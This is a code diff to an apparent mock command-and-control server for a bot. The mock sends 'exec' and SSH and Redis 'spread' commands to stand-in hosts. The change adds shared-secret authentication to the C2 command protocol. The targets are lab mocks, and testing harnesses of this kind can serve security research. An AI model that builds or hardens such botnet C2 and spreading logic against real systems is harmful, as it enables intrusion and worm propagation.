@@ -73,21 +73,34 @@ def handle_client(conn, addr):
                 })
                 print(f"[+] HTTP POST #{request_count} - {body[:120]}")
 
-                # Respond with commands based on global request count
+                # Respond with commands based on global request count.
+                # SECURITY FIX (#35): Echo the shared secret back in every
+                # command response. The bot rejects commands that do not
+                # contain "secret":"<configured c2_secret>". Extract it
+                # from the heartbeat body so the mock stays in sync with
+                # the bot's config.
+                secret = "mocksecret"
+                try:
+                    j = json.loads(body)
+                    if isinstance(j.get("secret"), str) and j["secret"]:
+                        secret = j["secret"]
+                except Exception:
+                    pass
+
                 if request_count == 1:
                     time.sleep(0.5)
-                    response = '{"cmd": "exec", "args": "uname -a"}'
+                    response = '{"cmd": "exec", "args": "uname -a", "secret": "%s"}' % secret
                     print(f"[>] Sending exec: {response}")
                 elif request_count == 2:
                     time.sleep(0.3)
-                    response = '{"cmd": "spread", "args": "mock-ssh:22"}'
+                    response = '{"cmd": "spread", "args": "mock-ssh:22", "secret": "%s"}' % secret
                     print(f"[>] Sending SSH spread: {response}")
                 elif request_count == 3:
                     time.sleep(0.3)
-                    response = '{"cmd": "spread", "args": "mock-redis:6379"}'
+                    response = '{"cmd": "spread", "args": "mock-redis:6379", "secret": "%s"}' % secret
                     print(f"[>] Sending Redis spread: {response}")
                 else:
-                    response = '{"status": "ok"}'
+                    response = '{"status": "ok", "secret": "%s"}' % secret
 
                 # Build HTTP/1.1 response
                 response_bytes = response.encode('utf-8')
